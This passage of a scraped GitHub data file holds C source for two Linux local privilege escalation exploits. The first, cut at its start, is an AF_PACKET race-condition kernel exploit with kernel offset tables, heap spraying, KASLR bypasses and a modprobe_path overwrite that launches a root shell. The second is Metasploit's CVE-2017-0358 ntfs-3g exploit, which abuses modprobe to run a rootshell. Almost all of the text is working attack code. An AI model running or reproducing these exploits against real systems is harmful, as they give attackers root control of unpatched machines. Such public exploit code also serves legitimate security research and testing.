0x28c9a0, 0x6fae0 },\n    { \"4.4.0-28-lowlatency #47-Ubuntu\",  0x88b20, 0xe48f80, 0x28ce20, 0x6fae0 },\n    { \"4.4.0-31-lowlatency #50-Ubuntu\",  0x88b20, 0xe48f80, 0x28cf10, 0x6fae0 },\n    { \"4.4.0-34-lowlatency #53-Ubuntu\",  0x88b20, 0xe48f80, 0x28cf50, 0x6fae0 },\n    { \"4.4.0-36-lowlatency #55-Ubuntu\",  0x88b00, 0xe48f80, 0x28cf30, 0x6fad0 },\n    { \"4.4.0-38-lowlatency #57-Ubuntu\",  0x88bd0, 0xe48f80, 0x28d580, 0x6fad0 },\n    { \"4.4.0-42-lowlatency #62-Ubuntu\",  0x88c30, 0xe48f80, 0x28d5b0, 0x6faa0 },\n};\n\n#define VSYSCALL              0xffffffffff600000\n#define PROC_DOSTRING         (KERNEL_BASE + kernels[kernel].proc_dostring)\n#define MODPROBE_PATH         (KERNEL_BASE + kernels[kernel].modprobe_path)\n#define REGISTER_SYSCTL_TABLE (KERNEL_BASE + kernels[kernel].register_sysctl_table)\n#define SET_MEMORY_RW         (KERNEL_BASE + kernels[kernel].set_memory_rw)\n\n#define KMALLOC_PAD 64\n\nint pad_fds[KMALLOC_PAD];\n\n// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *\n\nstruct ctl_table {\n    const char *procname;\n    void *data;\n    int maxlen;\n    unsigned short mode;\n    struct ctl_table *child;\n    void *proc_handler;\n    void *poll;\n    void *extra1;\n    void *extra2;\n};\n\n#define CONF_RING_FRAMES 1\n\nstruct tpacket_req3 tp;\nint sfd;\nint mapped = 0;\n\n// timer_list struct defined in: include/linux/timer.h\nstruct timer_list {\n    void *next;\n    void *prev;\n    unsigned long           expires;\n    void                    (*function)(unsigned long);\n    unsigned long           data;\n    unsigned int            flags;\n    int                     slack;\n};\n\n// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *\n\nvoid *setsockopt_thread(void *arg)\n{\n    while (barrier) {}\n    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));\n\n    return NULL;\n}\n\nvoid *vers_switcher(void *arg)\n{\n    int val,x,y;\n\n    while (barrier) {}\n\n    while (1) {\n        val = TPACKET_V1;\n        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));\n\n        y++;\n\n        if (x != 0) break;\n\n        val = TPACKET_V3;\n        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));\n\n        if (x != 0) break;\n\n        y++;\n    }\n\n    dprintf(\"[.] version switcher stopping, x = %d (y = %d, last val = %d)\\n\",x,y,val);\n    vers_switcher_done = 1;\n\n    return NULL;\n}\n\n// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *\n\n#define BUFSIZE 1408\nchar exploitbuf[BUFSIZE];\n\n#ifndef ETH_P_ARP\n#    define ETH_P_ARP 0x0806\n#endif\n\nvoid kmalloc(void)\n{\n    while(1)\n        syscall(__NR_add_key, \"user\", \"wtf\", exploitbuf, BUFSIZE - 24, -2);\n}\n\nvoid pad_kmalloc(void)\n{\n    int x;\n    for (x = 0; x < KMALLOC_PAD; x++)\n        if (socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP)) == -1) {\n            dprintf(\"[-] pad_kmalloc() socket error: %m\\n\");\n            exit(EXIT_FAILURE);\n        }\n}\n\n// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *\n\nint try_exploit(unsigned long func, unsigned long arg, void *verification_func)\n{\n    pthread_t setsockopt_thread_thread,a;\n    int val;\n    socklen_t l;\n    struct timer_list *timer;\n    int fd;\n    struct tpacket_block_desc *pbd;\n    int off;\n    sigset_t set;\n\n    sigemptyset(&set);\n\n    sigaddset(&set, SIGSEGV);\n\n    if (pthread_sigmask(SIG_BLOCK, &set, NULL) != 0) {\n        dprintf(\"[-] couldn't set sigmask: %m\\n\");\n        exit(1);\n    }\n\n    dprintf(\"[.] new exploit attempt starting, jumping to %p, arg=%p\\n\", (void *)func, (void *)arg);\n\n    pad_kmalloc();\n\n    fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));\n\n    if (fd == -1) {\n        dprintf(\"[-] target socket error: %m\\n\");\n        exit(1);\n    }\n\n    pad_kmalloc();\n\n    dprintf(\"[.] done, sockets allocated\\n\");\n\n    val = TPACKET_V3;\n\n    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));\n\n    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();\n    tp.tp_block_nr = 1;\n    tp.tp_frame_size = getpagesize();\n    tp.tp_frame_nr = CONF_RING_FRAMES;\n\n    // try to set the timeout to 10 seconds\n    // the default timeout might still be used though depending on when the race was won\n    tp.tp_retire_blk_tov = 10000;\n\n    sfd = fd;\n\n    if (pthread_create(&setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {\n        dprintf(\"[-] Error creating thread: %m\\n\");\n        return 1;\n    }\n\n    pthread_create(&a, NULL, vers_switcher, (void *)NULL);\n\n    usleep(200000);\n\n    dprintf(\"[.] removing barrier and spraying...\\n\");\n\n    memset(exploitbuf, '\\x00', BUFSIZE);\n\n    timer = (struct timer_list *)(exploitbuf+(0x6c*8)+6-8);\n    timer->next = 0;\n    timer->prev = 0;\n\n    timer->expires = 4294943360;\n    timer->function = (void *)func;\n    timer->data = arg;\n    timer->flags = 1;\n    timer->slack = -1;\n\n    barrier = 0;\n\n    usleep(100000);\n\n    while (!vers_switcher_done) usleep(100000);\n\n    l = sizeof(val);\n    getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, &l);\n\n    dprintf(\"[.] current packet version = %d\\n\",val);\n\n    pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);\n\n    if (pbd == MAP_FAILED) {\n        dprintf(\"[-] could not map pbd: %m\\n\");\n        exit(1);\n    } else {\n        off = pbd->hdr.bh1.offset_to_first_pkt;\n        dprintf(\"[.] pbd->hdr.bh1.offset_to_first_pkt = %d\\n\", off);\n    }\n\n\n    if (val == TPACKET_V1 && off != 0) {\n        dprintf(\"*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\\n\");\n    } else {\n        dprintf(\"[-] race not won\\n\");\n        exit(2);\n    }\n\n    munmap(pbd, tp.tp_block_size * tp.tp_block_nr);\n\n    pthread_create(&a, NULL, verification_func, (void *)NULL);\n\n    dprintf(\"\\n\");\n    dprintf(\"[!] please wait up to a few minutes for timer to be executed.\\n\");\n    dprintf(\"[!] if you ctrl-c now the kernel will hang. so don't do that.\\n\");\n    dprintf(\"\\n\");\n\n    sleep(1);\n    dprintf(\"[.] closing socket and verifying...\\n\");\n\n    close(sfd);\n\n    kmalloc();\n\n    dprintf(\"[.] all messages sent\\n\");\n\n    sleep(31337);\n    exit(1);\n}\n\nint verification_result = 0;\n\nvoid catch_sigsegv(int sig)\n{\n    verification_result = 0;\n    pthread_exit((void *)1);\n}\n\nvoid *modify_vsyscall(void *arg)\n{\n    unsigned long *vsyscall = (unsigned long *)(VSYSCALL+0x850);\n    unsigned long x = (unsigned long)arg;\n\n    sigset_t set;\n    sigemptyset(&set);\n    sigaddset(&set, SIGSEGV);\n\n    if (pthread_sigmask(SIG_UNBLOCK, &set, NULL) != 0) {\n        dprintf(\"[-] couldn't set sigmask: %m\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    signal(SIGSEGV, catch_sigsegv);\n\n    *vsyscall = 0xdeadbeef + x;\n\n    if (*vsyscall == 0xdeadbeef+x) {\n        dprintf(\"[~] vsyscall page altered!\\n\");\n        verification_result = 1;\n        pthread_exit(0);\n    }\n\n    return NULL;\n}\n\nvoid verify_stage1(void)\n{\n    pthread_t v_thread;\n\n    sleep(5);\n\n    int x;\n    for(x = 0; x < 300; x++) {\n\n        pthread_create(&v_thread, NULL, modify_vsyscall, 0);\n\n        pthread_join(v_thread, NULL);\n\n        if(verification_result == 1) {\n            exit(0);\n        }\n\n        write(2, \".\", 1);\n        sleep(1);\n    }\n\n    dprintf(\"[-] could not modify vsyscall\\n\");\n    exit(EXIT_FAILURE);\n}\n\nvoid verify_stage2(void)\n{\n    struct stat b;\n\n    sleep(5);\n\n    int x;\n    for(x = 0; x < 300; x++) {\n\n        if (stat(SYSCTL_PATH, &b) == 0) {\n            dprintf(\"[~] sysctl added!\\n\");\n            exit(0);\n        }\n\n        write(2, \".\", 1);\n        sleep(1);\n    }\n\n    dprintf(\"[-] could not add sysctl\\n\");\n    exit(EXIT_FAILURE);\n}\n\nvoid exploit(unsigned long func, unsigned long arg, void *verification_func)\n{\n    int status;\n    int pid;\n\nretry:\n\n    pid = fork();\n\n    if (pid == 0) {\n        try_exploit(func, arg, verification_func);\n        exit(1);\n    }\n\n    wait(&status);\n\n    dprintf(\"\\n\");\n\n    if (WEXITSTATUS(status) == 2) {\n        dprintf(\"[.] retrying stage...\\n\");\n        kill(pid, 9);\n        sleep(2);\n        goto retry;\n    }\n\n    if (WEXITSTATUS(status) != 0) {\n        dprintf(\"[-] something bad happened, aborting exploit attempt\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    kill(pid, 9);\n}\n\n\nvoid wrapper(void)\n{\n    struct ctl_table *c;\n\n    dprintf(\"[.] making vsyscall page writable...\\n\\n\");\n\n    exploit(SET_MEMORY_RW, VSYSCALL, verify_stage1);\n\n    dprintf(\"[~] done, stage 1 completed\\n\");\n\n    sleep(5);\n\n    dprintf(\"[.] registering new sysctl...\\n\\n\");\n\n    c = (struct ctl_table *)(VSYSCALL+0x850);\n\n    memset((char *)(VSYSCALL+0x850), '\\x00', 1952);\n\n    strcpy((char *)(VSYSCALL+0xf00), SYSCTL_NAME);\n    memcpy((char *)(VSYSCALL+0xe00), \"\\x01\\x00\\x00\\x00\",4);\n    c->procname = (char *)(VSYSCALL+0xf00);\n    c->mode = 0666;\n    c->proc_handler = (void *)(PROC_DOSTRING);\n    c->data = (void *)(MODPROBE_PATH);\n    c->maxlen = 256;\n    c->extra1 = (void *)(VSYSCALL+0xe00);\n    c->extra2 = (void *)(VSYSCALL+0xd00);\n\n    exploit(REGISTER_SYSCTL_TABLE, VSYSCALL+0x850, verify_stage2);\n\n    dprintf(\"[~] done, stage 2 completed\\n\");\n}\n\n// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * *\n\n#define CHUNK_SIZE 1024\n\nint read_file(const char* file, char* buffer, int max_length) {\n    int f = open(file, O_RDONLY);\n    if (f == -1)\n        return -1;\n    int bytes_read = 0;\n    while (1) {\n        int bytes_to_read = CHUNK_SIZE;\n        if (bytes_to_read > max_length - bytes_read)\n            bytes_to_read = max_length - bytes_read;\n        int rv = read(f, &buffer[bytes_read], bytes_to_read);\n        if (rv == -1)\n            return -1;\n        bytes_read += rv;\n        if (rv == 0)\n            return bytes_read;\n    }\n}\n\n#define PROC_CPUINFO_LENGTH 4096\n\nvoid check_env() {\n    int min_procs = 2;\n\n    int nprocs = 0;\n    nprocs = get_nprocs_conf();\n\n    if (nprocs < min_procs) {\n        dprintf(\"[-] system has less than %d processor cores\\n\", min_procs);\n        exit(EXIT_FAILURE);\n    }\n\n    char buffer[PROC_CPUINFO_LENGTH];\n    char* path = \"/proc/cpuinfo\";\n    int length = read_file(path, &buffer[0], PROC_CPUINFO_LENGTH);\n    if (length == -1) {\n        dprintf(\"[-] open/read(%s): %m\\n\", path);\n        exit(EXIT_FAILURE);\n    }\n\n    char* found = memmem(&buffer[0], length, \"smap\", 4);\n    if (found != NULL) {\n        dprintf(\"[-] SMAP detected, no bypass available\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    struct stat st;\n    if (stat(\"/dev/grsec\", &st) == 0) {\n        dprintf(\"[!] Warning: grsec is in use\\n\");\n    }\n}\n\nstruct utsname get_kernel_version() {\n    struct utsname u;\n    int rv = uname(&u);\n    if (rv != 0) {\n        dprintf(\"[-] uname())\\n\");\n        exit(EXIT_FAILURE);\n    }\n    return u;\n}\n\n#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))\n#define KERNEL_VERSION_SIZE_BUFFER 512\n\nvoid detect_versions() {\n    struct utsname u;\n    char kernel_version[KERNEL_VERSION_SIZE_BUFFER];\n\n    u = get_kernel_version();\n\n    if (strstr(u.machine, \"64\") == NULL) {\n        dprintf(\"[-] system is not using a 64-bit kernel\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    if (strstr(u.version, \"-Ubuntu\") == NULL) {\n        dprintf(\"[-] system is not using an Ubuntu kernel\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    char *u_ver = strtok(u.version, \" \");\n    snprintf(kernel_version, KERNEL_VERSION_SIZE_BUFFER, \"%s %s\", u.release, u_ver);\n\n    int i;\n    for (i = 0; i < ARRAY_SIZE(kernels); i++) {\n        if (strcmp(kernel_version, kernels[i].kernel_version) == 0) {\n            dprintf(\"[.] kernel version '%s' detected\\n\", kernels[i].kernel_version);\n            kernel = i;\n            return;\n        }\n    }\n\n    dprintf(\"[-] kernel version not recognized\\n\");\n    exit(EXIT_FAILURE);\n}\n\n// * * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *\n// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c\n\n#if ENABLE_KASLR_BYPASS_SYSLOG\n#define SYSLOG_ACTION_READ_ALL 3\n#define SYSLOG_ACTION_SIZE_BUFFER 10\n\nint mmap_syslog(char** buffer, int* size) {\n    *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);\n    if (*size == -1) {\n        dprintf(\"[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)\\n\");\n        return 0;\n    }\n\n    *size = (*size / getpagesize() + 1) * getpagesize();\n    *buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE,\n                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n    *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);\n    if (*size == -1) {\n        dprintf(\"[-] klogctl(SYSLOG_ACTION_READ_ALL)\\n\");\n        return 0;\n    }\n\n    return 1;\n}\n\nunsigned long get_kernel_addr_trusty(char* buffer, int size) {\n    const char* needle1 = \"Freeing unused\";\n    char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));\n    if (substr == NULL)\n        return 0;\n\n    int start = 0;\n    int end = 0;\n    for (end = start; substr[end] != '-'; end++);\n\n    const char* needle2 = \"ffffff\";\n    substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));\n    if (substr == NULL)\n        return 0;\n\n    char* endptr = &substr[16];\n    unsigned long addr = strtoul(&substr[0], &endptr, 16);\n\n    addr &= 0xffffffffff000000ul;\n\n    if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)\n        return addr;\n\n    return 0;\n}\n\nunsigned long get_kernel_addr_xenial(char* buffer, int size) {\n    const char* needle1 = \"Freeing unused\";\n    char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));\n    if (substr == NULL)\n        return 0;\n\n    int start = 0;\n    int end = 0;\n    for (start = 0; substr[start] != '-'; start++);\n    for (end = start; substr[end] != '\\n'; end++);\n\n    const char* needle2 = \"ffffff\";\n    substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));\n    if (substr == NULL)\n        return 0;\n\n    char* endptr = &substr[16];\n    unsigned long addr = strtoul(&substr[0], &endptr, 16);\n\n    addr &= 0xfffffffffff00000ul;\n    addr -= 0x1000000ul;\n\n    if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)\n        return addr;\n\n    return 0;\n}\n\nunsigned long get_kernel_addr_syslog() {\n    unsigned long addr = 0;\n    char* syslog;\n    int size;\n\n    dprintf(\"[.] trying syslog...\\n\");\n\n    if (!mmap_syslog(&syslog, &size))\n        return 0;\n\n    if (strstr(kernels[kernel].kernel_version, \"14.04.1\") != NULL)\n        addr = get_kernel_addr_trusty(syslog, size);\n    else\n        addr = get_kernel_addr_xenial(syslog, size);\n\n    if (!addr)\n        dprintf(\"[-] kernel base not found in syslog\\n\");\n\n    return addr;\n}\n#endif\n\n// * * * * * * * * * * * * * * kallsyms KASLR bypass * * * * * * * * * * * * * *\n// https://grsecurity.net/~spender/exploits/exploit.txt\n\n#if ENABLE_KASLR_BYPASS_KALLSYMS\nunsigned long get_kernel_addr_kallsyms() {\n    FILE *f;\n    unsigned long addr = 0;\n    char dummy;\n    char sname[256];\n    char* name = \"startup_64\";\n    char* path = \"/proc/kallsyms\";\n\n    dprintf(\"[.] trying %s...\\n\", path);\n    f = fopen(path, \"r\");\n    if (f == NULL) {\n        dprintf(\"[-] open/read(%s): %m\\n\", path);\n        return 0;\n    }\n\n    int ret = 0;\n    while (ret != EOF) {\n        ret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\n        if (ret == 0) {\n            fscanf(f, \"%s\\n\", sname);\n            continue;\n        }\n        if (!strcmp(name, sname)) {\n            fclose(f);\n            return addr;\n        }\n    }\n\n    fclose(f);\n    dprintf(\"[-] kernel base not found in %s\\n\", path);\n    return 0;\n}\n#endif\n\n// * * * * * * * * * * * * * * mincore KASLR bypass * * * * * * * * * * * * * *\n// https://bugs.chromium.org/p/project-zero/issues/detail?id=1431\n\n#if ENABLE_KASLR_BYPASS_MINCORE\nunsigned long get_kernel_addr_mincore() {\n    unsigned char buf[getpagesize() / sizeof(unsigned char)];\n    unsigned long iterations = 20000000;\n    unsigned long addr = 0;\n\n    dprintf(\"[.] trying mincore info leak...\\n\");\n\n    /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */\n    if (mmap((void*)0x66000000, 0x20000000000, PROT_NONE,\n          MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED) {\n        dprintf(\"[-] mmap(): %m\\n\");\n        return 0;\n    }\n\n    int i;\n    for (i = 0; i <= iterations; i++) {\n        /* Touch a mishandle with this type mapping */\n        if (mincore((void*)0x86000000, 0x1000000, buf)) {\n            dprintf(\"[-] mincore(): %m\\n\");\n            return 0;\n        }\n\n        int n;\n        for (n = 0; n < getpagesize() / sizeof(unsigned char); n++) {\n            addr = *(unsigned long*)(&buf[n]);\n            /* Kernel address space */\n            if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX) {\n                addr &= 0xffffffffff000000ul;\n                if (munmap((void*)0x66000000, 0x20000000000))\n                    dprintf(\"[-] munmap(): %m\\n\");\n                return addr;\n            }\n        }\n    }\n\n    if (munmap((void*)0x66000000, 0x20000000000))\n      dprintf(\"[-] munmap(): %m\\n\");\n\n    dprintf(\"[-] kernel base not found in mincore info leak\\n\");\n    return 0;\n}\n#endif\n\n// * * * * * * * * * * * * * * KASLR bypasses * * * * * * * * * * * * * * * *\n\nunsigned long get_kernel_addr() {\n    unsigned long addr = 0;\n\n#if ENABLE_KASLR_BYPASS_KALLSYMS\n    addr = get_kernel_addr_kallsyms();\n    if (addr) return addr;\n#endif\n\n#if ENABLE_KASLR_BYPASS_SYSLOG\n    addr = get_kernel_addr_syslog();\n    if (addr) return addr;\n#endif\n\n#if ENABLE_KASLR_BYPASS_MINCORE\n    addr = get_kernel_addr_mincore();\n    if (addr) return addr;\n#endif\n\n    dprintf(\"[-] KASLR bypass failed\\n\");\n    exit(EXIT_FAILURE);\n\n    return 0;\n}\n\n// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *\n\nvoid launch_rootshell(void)\n{\n    int fd;\n    char buf[256];\n    struct stat s;\n\n    fd = open(SYSCTL_PATH, O_WRONLY);\n\n    if(fd == -1) {\n        dprintf(\"[-] open(%s): %m\\n\", SYSCTL_PATH);\n        exit(EXIT_FAILURE);\n    }\n\n    memset(buf, '\\x00', 256);\n\n    readlink(\"/proc/self/exe\", (char *)&buf, 256);\n\n    write(fd, buf, strlen(buf)+1);\n\n    socket(AF_INET, SOCK_STREAM, 132);\n\n    if (stat(buf,&s) == 0 && s.st_uid == 0) {\n        dprintf(\"[+] binary executed by kernel, launching rootshell\\n\");\n        lseek(fd, 0, SEEK_SET);\n        write(fd, \"/sbin/modprobe\", 15);\n        close(fd);\n        execl(buf, buf, NULL);\n    } else {\n        dprintf(\"[-] could not create rootshell\\n\");\n        exit(EXIT_FAILURE);\n    }\n}\n\nvoid setup_sandbox() {\n    if (unshare(CLONE_NEWUSER) != 0) {\n        dprintf(\"[-] unshare(CLONE_NEWUSER): %m\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    if (unshare(CLONE_NEWNET) != 0) {\n        dprintf(\"[-] unshare(CLONE_NEWNET): %m\\n\");\n        exit(EXIT_FAILURE);\n    }\n}\n\nint main(int argc, char **argv)\n{\n    int status, pid;\n\n    if (getuid() == 0 && geteuid() == 0) {\n        chown(\"/proc/self/exe\", 0, 0);\n        chmod(\"/proc/self/exe\", 06755);\n        exit(0);\n    }\n\n    if (getuid() != 0 && geteuid() == 0) {\n        setresuid(0, 0, 0);\n        setresgid(0, 0, 0);\n        execl(\"/bin/bash\", \"bash\", \"-p\", NULL);\n        exit(0);\n    }\n\n    dprintf(\"linux AF_PACKET race condition exploit by rebel\\n\");\n\n#if ENABLE_SYSTEM_CHECKS\n    dprintf(\"[.] checking system\\n\");\n    check_env();\n    dprintf(\"[~] done, looks good\\n\");\n#endif\n\n    dprintf(\"[.] checking kernel version\\n\");\n    detect_versions();\n    dprintf(\"[~] done, version looks good\\n\");\n\n#if ENABLE_KASLR_BYPASS\n    dprintf(\"[.] KASLR bypass enabled, getting kernel base address\\n\");\n    KERNEL_BASE = get_kernel_addr();\n    dprintf(\"[~] done, kernel text:     %lx\\n\", KERNEL_BASE);\n#endif\n\n    dprintf(\"[.] proc_dostring:         %lx\\n\", PROC_DOSTRING);\n    dprintf(\"[.] modprobe_path:         %lx\\n\", MODPROBE_PATH);\n    dprintf(\"[.] register_sysctl_table: %lx\\n\", REGISTER_SYSCTL_TABLE);\n    dprintf(\"[.] set_memory_rw:         %lx\\n\", SET_MEMORY_RW);\n\n    pid = fork();\n    if (pid == 0) {\n        dprintf(\"[.] setting up namespace sandbox\\n\");\n        setup_sandbox();\n        dprintf(\"[~] done, namespace sandbox set up\\n\");\n        wrapper();\n        exit(0);\n    }\n\n    waitpid(pid, &status, 0);\n\n    launch_rootshell();\n    return 0;\n}\n", "timestamp": "2025-10-24T23:39:30.871802"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2017-0358/sploit.c", "content": "#define _GNU_SOURCE\n#include <stdbool.h>\n#include <errno.h>\n#include <sys/inotify.h>\n#include <unistd.h>\n#include <err.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <fcntl.h>\n#include <sys/eventfd.h>\n#include <signal.h>\n#include <poll.h>\n#include <stdio.h>\n#include <sys/prctl.h>\n#include <string.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <sys/utsname.h>\n\nint main(void) {\n  /* prevent shell from backgrounding ntfs-3g when stopped */\n  pid_t initial_fork_child = fork();\n  if (initial_fork_child == -1)\n    err(1, \"initial fork\");\n  if (initial_fork_child != 0) {\n    int status;\n    if (waitpid(initial_fork_child, &status, 0) != initial_fork_child)\n      err(1, \"waitpid\");\n    execl(\"rootshell\", \"rootshell\", NULL);\n    exit(0);\n  }\n\n  char buf[1000] = {0};\n  // Set up workspace with volume, mountpoint, modprobe config and module directory.\n  char template[] = \"/tmp/ntfs_sploit.XXXXXX\";\n  if (mkdtemp(template) == NULL)\n    err(1, \"mkdtemp\");\n  char volume[100], mountpoint[100], modprobe_confdir[100], modprobe_conffile[100];\n  sprintf(volume, \"%s/volume\", template);\n  sprintf(mountpoint, \"%s/mountpoint\", template);\n  sprintf(modprobe_confdir, \"%s/modprobe.d\", template);\n  sprintf(modprobe_conffile, \"%s/sploit.conf\", modprobe_confdir);\n  if (mkdir(volume, 0777) || mkdir(mountpoint, 0777) || mkdir(modprobe_confdir, 0777))\n    err(1, \"mkdir\");\n  int conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, 0666);\n  if (conffd == -1)\n    err(1, \"open modprobe config\");\n  int suidfile_fd = open(\"rootshell\", O_RDONLY);\n  if (suidfile_fd == -1)\n    err(1, \"unable to open ./rootshell\");\n  char modprobe_config[200];\n  sprintf(modprobe_config, \"alias fuse rootmod\\noptions rootmod suidfile_fd=%d\\n\", suidfile_fd);\n  if (write(conffd, modprobe_config, strlen(modprobe_config)) != strlen(modprobe_config))\n    errx(1, \"modprobe config write failed\");\n  close(conffd);\n  // module directory setup\n  char system_cmd[1000];\n  sprintf(system_cmd, \"mkdir -p %s/lib/modules/$(uname -r) && cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/\",\n    template, template);\n  if (system(system_cmd))\n    errx(1, \"shell command failed\");\n\n  // Set up inotify watch for /proc/mounts.\n  // Note: /proc/mounts is a symlink to /proc/self/mounts, so\n  // the watch will only see accesses by this process.\n  int inotify_fd = inotify_init1(IN_CLOEXEC);\n  if (inotify_fd == -1)\n    err(1, \"unable to create inotify fd?\");\n  if (inotify_add_watch(inotify_fd, \"/proc/mounts\", IN_OPEN) == -1)\n    err(1, \"unable to watch /proc/mounts\");\n\n  // Set up inotify watch for /proc/filesystems.\n  // This can be used to detect whether we lost the race.\n  int fs_inotify_fd = inotify_init1(IN_CLOEXEC);\n  if (fs_inotify_fd == -1)\n    err(1, \"unable to create inotify fd?\");\n  if (inotify_add_watch(fs_inotify_fd, \"/proc/filesystems\", IN_OPEN) == -1)\n    err(1, \"unable to watch /proc/filesystems\");\n\n  // Set up inotify watch for /sbin/modprobe.\n  // This can be used to detect when we can release all our open files.\n  int modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);\n  if (modprobe_inotify_fd == -1)\n    err(1, \"unable to create inotify fd?\");\n  if (inotify_add_watch(modprobe_inotify_fd, \"/sbin/modprobe\", IN_OPEN) == -1)\n    err(1, \"unable to watch /sbin/modprobe\");\n\n  int do_exec_pipe[2];\n  if (pipe2(do_exec_pipe, O_CLOEXEC))\n    err(1, \"pipe\");\n  pid_t child = fork();\n  if (child == -1)\n    err(1, \"fork\");\n  if (child != 0) {\n    if (read(do_exec_pipe[0], buf, 1) != 1)\n      errx(1, \"pipe read failed\");\n    char modprobe_opts[300];\n    sprintf(modprobe_opts, \"-C %s -d %s\", modprobe_confdir, template);\n    setenv(\"MODPROBE_OPTIONS\", modprobe_opts, 1);\n    execlp(\"ntfs-3g\", \"ntfs-3g\", volume, mountpoint, NULL);\n  }\n  child = getpid();\n\n  // Now launch ntfs-3g and wait until it opens /proc/mounts\n  if (write(do_exec_pipe[1], buf, 1) != 1)\n    errx(1, \"pipe write failed\");\n\n  if (read(inotify_fd, buf, sizeof(buf)) <= 0)\n    errx(1, \"inotify read failed\");\n  if (kill(getppid(), SIGSTOP))\n    err(1, \"can't stop setuid parent\");\n\n  // Check whether we won the main race.\n  struct pollfd poll_fds[1] = {{\n    .fd = fs_inotify_fd,\n    .events = POLLIN\n  }};\n  int poll_res = poll(poll_fds, 1, 100);\n  if (poll_res == -1)\n    err(1, \"poll\");\n  if (poll_res == 1) {\n    puts(\"looks like we lost the race\");\n    if (kill(getppid(), SIGKILL))\n      perror(\"SIGKILL after lost race\");\n    char rm_cmd[100];\n    sprintf(rm_cmd, \"rm -rf %s\", template);\n    system(rm_cmd);\n    exit(1);\n  }\n  puts(\"looks like we won the race\");\n\n  // Open as many files as possible. Whenever we have\n  // a bunch of open files, move them into a new process.\n  int total_open_files = 0;\n  while (1) {\n    #define LIMIT 500\n    int open_files[LIMIT];\n    bool reached_limit = false;\n    int n_open_files;\n    for (n_open_files = 0; n_open_files < LIMIT; n_open_files++) {\n      open_files[n_open_files] = eventfd(0, 0);\n      if (open_files[n_open_files] == -1) {\n        if (errno != ENFILE)\n          err(1, \"eventfd() failed\");\n        printf(\"got ENFILE at %d total\\n\", total_open_files);\n        reached_limit = true;\n        break;\n      }\n      total_open_files++;\n    }\n    pid_t fd_stasher_child = fork();\n    if (fd_stasher_child == -1)\n      err(1, \"fork (for eventfd holder)\");\n    if (fd_stasher_child == 0) {\n      prctl(PR_SET_PDEATHSIG, SIGKILL);\n      // close PR_SET_PDEATHSIG race window\n      if (getppid() != child) raise(SIGKILL);\n      while (1) pause();\n    }\n    for (int i = 0; i < n_open_files; i++)\n      close(open_files[i]);\n    if (reached_limit)\n      break;\n  }\n\n  // Wake up ntfs-3g and keep allocating files, then free up\n  // the files as soon as we're reasonably certain that either\n  // modprobe was spawned or the attack failed.\n  if (kill(getppid(), SIGCONT))\n    err(1, \"SIGCONT\");\n\n  time_t start_time = time(NULL);\n  while (1) {\n    for (int i=0; i<1000; i++) {\n      int efd = eventfd(0, 0);\n      if (efd == -1 && errno != ENFILE)\n        err(1, \"gapfiller eventfd() failed unexpectedly\");\n    }\n    struct pollfd modprobe_poll_fds[1] = {{\n      .fd = modprobe_inotify_fd,\n      .events = POLLIN\n    }};\n    int modprobe_poll_res = poll(modprobe_poll_fds, 1, 0);\n    if (modprobe_poll_res == -1)\n      err(1, \"poll\");\n    if (modprobe_poll_res == 1) {\n      puts(\"yay, modprobe ran!\");\n      exit(0);\n    }\n    if (time(NULL) > start_time + 3) {\n      puts(\"modprobe didn't run?\");\n      exit(1);\n    }\n  }\n}\n", "timestamp": "2025-10-24T23:39:31.218280"}
